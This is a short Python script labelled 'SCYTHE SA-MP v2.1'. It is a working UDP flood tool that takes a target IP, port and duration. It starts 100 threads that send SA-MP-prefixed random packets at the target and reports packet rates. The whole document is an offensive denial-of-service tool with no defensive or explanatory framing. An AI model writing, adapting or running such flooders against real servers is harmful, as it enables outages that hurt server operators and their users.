# SCYTHE SA-MP v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 4: print('Usage: python3 samp.py <ip> <port> <time>'); sys.exit(1)
ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] SA-MP: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.sendto(b'SAMP' + random._urandom(100), (ip, port))
      s.close();
      with lock: total += 1
    except: pass
for _ in range(100):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[SAMP] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[SAMP] Completed: {total} packets')